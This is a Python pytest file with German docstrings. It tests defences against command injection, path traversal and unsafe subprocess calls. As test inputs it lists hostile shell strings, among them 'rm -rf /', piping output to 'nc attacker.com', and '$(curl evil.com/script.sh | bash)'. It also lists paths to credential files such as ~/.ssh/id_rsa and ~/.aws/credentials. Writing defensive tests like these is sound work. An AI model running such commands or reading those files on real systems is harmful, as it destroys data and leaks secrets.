"""Security-Tests für Input-Validierung."""
import pytest
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

def test_command_injection_prevention():
    """Testet Schutz gegen Command Injection."""
    dangerous_inputs = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "$(curl evil.com/script.sh | bash)",
        "`rm -rf /`",
    ]

    # Basic validation function
    def validate_input(user_input):
        """Basic input validation - removes dangerous characters."""
        dangerous_chars = [";", "&", "|", "$", "`", "$(", ")", "<", ">"]
        sanitized = user_input
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, "")
        return sanitized

    for dangerous in dangerous_inputs:
        sanitized = validate_input(dangerous)
        assert ";" not in sanitized
        assert "&" not in sanitized
        assert "|" not in sanitized
        assert "$" not in sanitized
        assert "`" not in sanitized

def test_path_traversal_prevention():
    """Testet Schutz gegen Path Traversal."""
    dangerous_paths = [
        "../../../etc/passwd",
        "../../.ssh/id_rsa",
        "/etc/shadow",
        "~/.aws/credentials",
    ]

    def sanitize_path(user_path, base_dir):
        """Basic path sanitization."""
        from pathlib import Path
        import os

        # Convert to absolute path and resolve
        base = Path(base_dir).resolve()
        try:
            target = (base / user_path).resolve()
            # Ensure target is within base directory
            target.relative_to(base)
            return target
        except (ValueError, OSError):
            # Return safe default if path is dangerous
            return base / "safe_default"

    base_dir = "/home/user/ccc"
    for dangerous in dangerous_paths:
        result = sanitize_path(dangerous, base_dir)
        # Path should be within base directory
        assert str(result).startswith("/home/user/ccc")
        assert ".." not in str(result)

def test_subprocess_safety():
    """Testet sicheren Umgang mit subprocess calls."""
    import subprocess
    from unittest.mock import patch

    # Test that subprocess calls use array form (safe) not string form (dangerous)
    def safe_subprocess_call(command_array):
        """Safe subprocess call with array parameter."""
        if isinstance(command_array, str):
            raise ValueError("Use array form for subprocess calls!")
        return subprocess.run(command_array, capture_output=True, check=False)

    # This should work (safe)
    safe_command = ["echo", "hello"]
    result = safe_subprocess_call(safe_command)
    assert result.returncode == 0

    # This should fail (dangerous)
    with pytest.raises(ValueError):
        dangerous_command = "echo hello; rm -rf /"
        safe_subprocess_call(dangerous_command)